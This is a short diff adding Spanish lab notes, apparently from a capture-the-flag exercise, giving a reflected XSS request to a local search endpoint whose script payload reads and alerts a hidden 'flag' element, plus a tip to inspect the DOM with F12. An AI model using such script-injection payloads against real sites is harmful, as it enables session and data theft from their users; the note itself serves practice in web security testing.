@@ -1,0 +1,6 @@
+peticion XSS para leer el contenido de la flag
+
+
+http://localhost:5000/search?q=<script>alert(document.getElementById('flag').innerText)</script>
+
+F12 -- contendido oculto DOM
